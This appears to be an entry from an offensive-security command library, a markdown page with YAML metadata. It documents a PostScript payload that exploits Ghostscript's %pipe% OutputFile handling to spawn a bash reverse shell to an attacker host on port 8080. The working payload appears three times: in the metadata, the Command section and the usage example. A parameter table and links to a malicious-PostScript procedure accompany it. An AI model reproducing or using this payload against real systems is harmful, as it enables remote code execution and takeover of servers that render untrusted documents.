---
data: >-
  %!PS

  userdict /setpagedevice undef

  legal

  { null restore } stopped { pop } if

  legal

  mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1')
  currentdevice putdeviceprops
tags:
  - rce
  - payload
type: command
executor: bash
platforms:
  - Linux
id: ac088209-8d2b-4a28-a87f-73f9f3a26de3
created_at: '2025-12-11T06:10:33.009Z'
updated_at: '2025-12-11T06:10:33.009Z'
verified: false
validated: true
submitted: true
---
# postscript-payload-rce

## Command

```bash
%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

## Description

Postscript payload that triggers a reverse shell via Ghostscript by setting OutputFile to pipe a bash command.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/OutputFile` | Sets output to pipe the bash reverse shell command | Yes |
| `%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1'` | Executes interactive bash shell to attacker's IP on port 8080 | Yes |

## Examples

### Basic Usage

```bash
%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

## Expected Output

Establishes reverse shell connection when processed by Ghostscript.

## Related

- [[commands/bash-reverse-shell]]
- [[procedures/Create-Malicious-Postscript-Payload]]
